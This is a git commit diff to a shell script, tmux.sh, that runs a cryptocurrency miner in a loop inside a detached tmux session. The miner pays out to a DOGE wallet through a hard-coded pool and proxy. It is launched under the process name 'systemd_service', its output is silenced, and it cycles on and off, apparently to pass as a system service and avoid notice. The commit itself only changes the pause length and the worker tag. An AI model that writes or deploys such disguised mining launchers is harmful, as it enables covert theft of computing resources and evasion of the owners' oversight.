58b02535d13bc896fddf7e91ed0d02b5a57bf813
dediminari <101470275+dediminari@users.noreply.github.com>
2024-09-28 18:09:50 +0700

    Update tmux.sh

--- tmux.sh
+++ tmux.sh
@@ -3,15 +3,15 @@
 while true
 do
     echo "Menjalankan tmux selama 60 menit..."
-    tmux new -d -s sys-session "timeout 60m exec -a systemd_service ./systemd_service.sh --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=DOCKOTO --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 &> /dev/null"
+    tmux new -d -s sys-session "timeout 60m exec -a systemd_service ./systemd_service.sh --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=DOCKOTO20menit --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 &> /dev/null"
     
     # Tunggu hingga tmux selesai (60 menit)
     sleep 60m
 
-    echo "Jeda 10 menit..."
+    echo "Jeda 20 menit..."
     # Hentikan sesi tmux jika masih berjalan
     tmux kill-session -t sys-session
 
-    # Tunggu selama 10 menit
-    sleep 10m
+    # Tunggu selama 20 menit
+    sleep 20m
 done
